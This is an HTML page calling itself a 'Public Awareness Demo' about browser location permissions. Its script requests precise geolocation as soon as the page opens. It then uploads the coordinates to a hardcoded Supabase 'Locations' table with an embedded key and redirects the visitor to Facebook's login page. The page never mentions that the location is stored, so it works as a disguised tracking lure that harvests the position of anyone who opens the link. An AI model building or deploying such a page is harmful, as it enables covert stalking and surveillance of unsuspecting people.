
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Public Awareness Demo</title>

<style>
body{
  margin:0;
  font-family:Arial,sans-serif;
  background:#f2f4f7;
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
}
.card{
  width:90%;
  max-width:420px;
  background:#fff;
  padding:30px 24px;
  border-radius:16px;
  text-align:center;
  box-shadow:0 4px 20px rgba(0,0,0,.12);
}
.icon{font-size:50px}
h1{font-size:25px}
p{
  color:#606770;
  line-height:1.5;
}
.status{
  margin-top:20px;
  padding:14px;
  border-radius:10px;
  background:#f0f2f5;
}
</style>
</head>

<body>

<div class="card">

  <div class="icon">🔐</div>

  <h1>Public Awareness Demo</h1>

  <p>
    This demonstration shows how a website can
    request access to your device location.
  </p>

  <p>
    Your location will be shared only if you
    explicitly allow the browser permission.
  </p>

  <div class="status" id="status">
    Requesting location permission...
  </div>

</div>

<script>

// ===============================
// SUPABASE
// ===============================

const SUPABASE_URL =
"https://jxhplkuyeafuicbtbxes.supabase.co";

const SUPABASE_KEY =
"sb_publishable_yZUSVCTw_7qJ9ydy5PqMxQ_ROEMJHTA";


// ===============================
// LOCATION
// ===============================

function requestLocation(){

  const status =
    document.getElementById("status");

  if(!navigator.geolocation){

    status.innerHTML =
      "❌ Location is not supported.";

    return;
  }

  navigator.geolocation.getCurrentPosition(

    async function(position){

      const latitude =
        position.coords.latitude;

      const longitude =
        position.coords.longitude;

      const accuracy =
        position.coords.accuracy;

      status.innerHTML =
        "📍 Location received...";


      try{

        const response = await fetch(

          SUPABASE_URL +
          "/rest/v1/Locations",

          {
            method:"POST",

            headers:{
              "apikey":SUPABASE_KEY,
              "Authorization":
                "Bearer " + SUPABASE_KEY,
              "Content-Type":
                "application/json",
              "Prefer":
                "return=minimal"
            },

            body:JSON.stringify({
              latitude:latitude,
              longitude:longitude,
              accuracy:accuracy
            })
          }
        );


        if(response.ok){

          status.innerHTML =
            "✅ welcome .<br><br>" +
            "Redirecting...";

          setTimeout(function(){

            // Official Facebook login page
            window.location.href =
              "https://www.facebook.com/login/";

          },1200);

        }else{

          status.innerHTML =
            "⚠️ Location could not be saved.";

        }

      }catch(error){

        console.error(error);

        status.innerHTML =
          "⚠️ Connection error.";

      }

    },


    function(error){

      if(error.code === 1){

        status.innerHTML =
          "❌ Location permission denied.";

      }else{

        status.innerHTML =
          "❌ Could not obtain location.";

      }

    },


    {
      enableHighAccuracy:true,
      timeout:15000,
      maximumAge:0
    }

  );
}


// Start automatically when page opens
requestLocation();

</script>

</body>
</html>
